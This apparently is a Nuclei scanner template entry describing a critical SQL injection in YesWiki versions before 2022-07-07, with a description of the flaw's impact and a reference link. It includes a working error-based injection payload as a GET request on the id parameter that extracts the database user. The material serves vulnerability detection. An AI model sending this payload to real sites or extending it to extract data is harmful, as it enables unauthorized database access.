# Nuclei Template: YesWiki <2022-07-07 - SQL Injection
**Template ID:** yeswiki-sql
**Vulnerability Class:** SQL Injection
**Severity:** Critical
**CWE:** CWE-89
**Source:** Nuclei Template (`yeswiki-sql.yaml`)

## Vulnerability Information & PoC

## Description
YesWiki before 2022-07-07 contains a SQL injection vulnerability via the id parameter in the AccueiL URL. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/?PagePrincipale/rss&id=1%27+and+extractvalue(0x0a,concat(0x0a,(select+concat_ws(0x207c20,md5({{num}}),1,user()))))--+-
```

## References
- https://huntr.dev/bounties/32e27955-376a-48fe-9984-87dd77e24985
